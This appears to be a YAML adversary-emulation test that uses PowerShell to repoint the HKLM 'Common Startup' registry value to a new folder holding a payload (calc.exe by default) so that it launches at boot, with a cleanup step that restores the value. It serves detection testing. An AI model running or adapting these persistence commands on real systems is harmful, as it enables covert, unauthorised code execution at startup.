api_version: "2.0"
name: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value
description: "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n"
args:
    - name: new_startup_folder
      type: string
      default: $env:TMP\atomictest\
    - name: payload
      type: string
      default: C:\Windows\System32\calc.exe
uuid: acfef903-7662-447e-a391-9c91c2f00f7b
mitre:
    tactics:
        - 'TA0003: Persistence'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1547: Boot or Logon Autostart Execution'
    subtechniques:
        - 'T1547.001: Registry Run Keys / Startup Folder'
requirements:
    platforms:
        - os: windows
steps:
    - name: change-startup-folder---hklm-modify-user-shell-folders-common-startup-value
      inline: |
        New-Item -ItemType Directory -path "{{.Args.new_startup_folder}}"
        Copy-Item -path "{{.Args.payload}}" -destination "{{.Args.new_startup_folder}}"
        Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "{{.Args.new_startup_folder}}"
      executor: powershell
      cleanup:
        inline: |
            Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
            Remove-Item "{{.Args.new_startup_folder}}" -Recurse -Force
        executor: powershell
